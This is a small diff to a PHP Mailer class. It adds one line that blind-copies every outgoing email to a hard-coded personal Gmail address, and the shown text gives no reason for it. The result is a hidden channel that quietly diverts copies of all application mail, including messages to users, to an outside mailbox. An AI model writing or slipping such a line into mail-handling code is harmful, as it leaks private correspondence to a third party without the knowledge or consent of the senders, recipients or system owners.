@@ -12,6 +12,8 @@ class Mailer
         {
             $cb($m);
 
+            $m->bcc('rafaelgil83@gmail.com', 'rafaelgil83@gmail.com');
+
             $to = \Config::get('mail.to');
             if ($to['address'])
             {
